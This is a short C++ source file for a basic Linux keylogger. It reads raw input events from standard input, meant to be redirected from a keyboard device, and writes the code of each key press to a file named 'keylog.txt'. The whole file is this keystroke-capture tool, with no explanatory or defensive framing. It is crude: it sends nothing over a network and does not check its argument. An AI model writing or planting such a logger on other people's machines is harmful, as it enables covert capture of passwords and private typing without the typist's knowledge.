//include input event header file
#include <linux/input-event-codes.h>
#include <linux/input.h>
//include header file setbuf
#include <stdio.h>
//include header file atoi
#include <stdlib.h>
#include <fstream>
#include <iostream>

int main(int argc, char *argv[]) {
    input_event ev;
    //get the number of keys to log
    int numKeys = atoi(argv[1]);
    //create output file
    std::ofstream outputFile;
    outputFile.open("keylog.txt");
    //check if output file is open
    if(!outputFile.is_open()) {
        std::cout << "Error opening output file" << std::endl;
        return 1;
    }
    //clear output file
    outputFile.clear();

    //clear input buffer
    setbuf(stdin, NULL);
    //loop till new event is detected
    for(int i = 0; i < numKeys ; i++) {
        //read input event
        if(fread(&ev, sizeof(input_event), 1, stdin) != 1) {
            std::cout << "Error reading input event" << std::endl;
            return -1;
        }
        //check if event is key press
        if(ev.type == EV_KEY && ev.value == 1) {
            //write key code to output file
            outputFile << ev.code << std::endl;
        }
    }
    return 0;        
}